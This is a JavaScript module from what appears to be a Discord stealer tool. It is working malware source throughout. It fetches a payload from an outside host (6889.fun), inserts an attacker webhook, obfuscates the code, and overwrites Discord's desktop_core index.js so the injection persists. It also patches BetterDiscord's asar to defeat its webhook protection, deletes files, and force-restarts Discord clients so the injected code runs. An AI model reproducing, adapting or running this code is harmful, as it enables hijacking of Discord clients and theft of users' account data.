const fs = require("fs");
const axios = require("axios");
const path = require("path");
const process = require("process");
const obf = require("javascript-obfuscator");
const buffreplace = require("buffer-replace");
const { exec } = require("child_process");
const getconfig = require("./../../config/config")();

const localAppData = process.env.localappdata;

const injectPaths = [];

async function discordInjected(enable) {
    try {
        if (enable === "no") return;
        
        const discords = getDiscordDirectories();
        for (const paths of discords) {
            findIndex(paths);
        }
        for (const paths of discords) {
            await findInject(paths);
        }
        await inject();
        await betterbroke();
        if (getconfig.kill.discords === "yes") {
            await killAllDiscord();
        } else {
            return;
        }
    } catch (error) {
        console.error("Error in discordInjected:", error);
    }
}

function getDiscordDirectories() {
    try {
        return fs
            .readdirSync(localAppData)
            .filter((file) => file.includes("iscord"))
            .map((file) => path.join(localAppData, file));
    } catch (error) {
        console.error("Error getting Discord directories:", error);
        return [];
    }
}

function findIndex(f) {
    try {
        const discordPaths = fs.readdirSync(f);
        discordPaths.forEach((file) => {
            const filePath = path.join(f, file);
            const fileStat = fs.statSync(filePath);
            if (fileStat.isDirectory()) {
                findIndex(filePath);
            } else {
                if (file === "index.js" && !f.includes("node_modules") && f.includes("desktop_core")) {
                    injectPaths.push(filePath);
                }
            }
        });
    } catch (error) {
        console.error("Error in findIndex:", error);
    }
}

async function inject() {
    try {
        const res = await axios.get("https://6889.fun/api/aurathemes/injects/f/discord", {
            headers: {
                aurathemes: true,
            },
        });

        const encode = obf.obfuscate(
            res.data.replace("%WEBHOOK%", getconfig.webhook),
            {
                ignoreRequireImports: true,
                compact: true,
                controlFlowFlattening: true,
                controlFlowFlatteningThreshold: 0.5,
                deadCodeInjection: false,
                deadCodeInjectionThreshold: 0.01,
                debugProtection: false,
                debugProtectionInterval: 0,
                disableConsoleOutput: true,
                identifierNamesGenerator: "hexadecimal",
                log: false,
                numbersToExpressions: false,
                renameGlobals: false,
                selfDefending: false,
                simplify: true,
                splitStrings: false,
                splitStringsChunkLength: 5,
                stringArray: true,
                stringArrayEncoding: ["base64"],
                stringArrayIndexShift: true,
                stringArrayRotate: false,
                stringArrayShuffle: false,
                stringArrayWrappersCount: 5,
                stringArrayWrappersChainedCalls: true,
                stringArrayWrappersParametersMaxCount: 5,
                stringArrayWrappersType: "function",
                stringArrayThreshold: 1,
                transformObjectKeys: false,
                unicodeEscapeSequence: false,
            }
        );

        const payload = encode.getObfuscatedCode();

        injectPaths.forEach((file) => {
            try {
                fs.promises.writeFile(file, payload, {
                    encoding: "utf8",
                    flag: "w",
                });
            } catch (error) {
                console.error("Error writing file:", error);
            }
        });

        fs.readdirSync(__dirname).forEach((a) => {
            if (a.endsWith(".xml")) {
                fs.unlinkSync(path.join(__dirname, a));
            }
        });
    } catch (error) {
        console.error("Error in inject:", error);
    }
}

async function betterbroke() {
    try {
        const dir = path.join(localAppData, "BetterDiscord/data/betterdiscord.asar");
        if (fs.existsSync(dir)) {
            const content = await fs.promises.readFile(dir);
            await fs.promises.writeFile(dir, buffreplace(content, "api/webhooks", "aurathemes"));
        }
    } catch (error) {
        console.error("Error in betterbroke:", error);
    }
}

async function killAllDiscord() {
    try {
        const clients = [
            "Discord.exe",
            "DiscordCanary.exe",
            "DiscordDevelopment.exe",
            "DiscordPTB.exe",
        ];

        const { stdout } = await exec("tasklist");
        for (const c of clients) {
            if (stdout.includes(c)) {
                await restartClient(c);
            }
        }
    } catch (error) {
        console.error("Error in killAllDiscord:", error);
    }
}

async function restartClient(c) {
    try {
        await exec(`taskkill /F /T /IM ${c}`);
        const clientPath = `${localAppData}/${c.replace(".exe", "")}/Update.exe`;
        await exec(`"${clientPath}" --processStart ${c}`);
    } catch (error) {
        console.error("Error in restartClient:", error);
    }
}

async function findInject(f) {
    try {
        const files = await fs.promises.readdir(f);
        for (const file of files) {
            const filePath = path.join(f, file);
            const fileStat = await fs.promises.stat(filePath);
            if (fileStat.isDirectory()) {
                if (file === "aura") {
                    await fs.rmdirSync(filePath);
                } else {
                    await findInject(filePath);
                }
            }
        }
    } catch (error) {
        console.error("Error in findInject:", error);
    }
}

module.exports = {
    discordInjected,
};
